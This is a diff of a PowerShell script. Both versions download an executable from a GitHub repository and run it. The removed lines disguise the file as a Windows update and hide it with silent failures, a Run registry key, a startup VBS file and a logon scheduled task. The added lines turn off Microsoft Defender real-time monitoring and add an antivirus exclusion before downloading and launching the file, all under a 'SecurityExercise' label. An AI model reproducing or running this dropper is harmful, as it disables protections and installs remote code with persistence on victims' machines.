@@ -1,46 +1,12 @@
-# Absolute minimal script with just core functionality
-$url = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
-$path = "$env:TEMP\update.exe"
+New-Item -Path "C:\SecurityExercise" -ItemType Directory -Force
 
-# Try to download
-try {
-    (New-Object Net.WebClient).DownloadFile($url, $path)
-} catch {
-    # Silent failure
-}
+Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Add to startup
-try {
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "`"$path`" /silent" -Force
-} catch {
-    # Silent failure
-}
+Add-MpPreference -ExclusionPath "C:\SecurityExercise"
 
-# Create startup VBS
-try {
-    $folder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-    $vbs = @"
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "$path /silent", 0, False
-"@
-    $vbs | Out-File -FilePath "$folder\update.vbs" -Encoding ASCII
-} catch {
-    # Silent failure
-}
+$down = New-Object System.Net.WebClient
+$url = 'https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe'
+$file = 'C:\SecurityExercise\demo-file.exe'
+$down.DownloadFile($url,$file)
 
-# Simple scheduled task approach
-try {
-    $action = New-ScheduledTaskAction -Execute $path -Argument "/silent"
-    $trigger = New-ScheduledTaskTrigger -AtLogOn
-    Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Force
-} catch {
-    # Silent failure
-}
-
-# Try to run now
-try {
-    Start-Process $path -ArgumentList "/silent"
-} catch {
-    # Silent failure
-}
+Start-Process "C:\SecurityExercise\demo-file.exe"
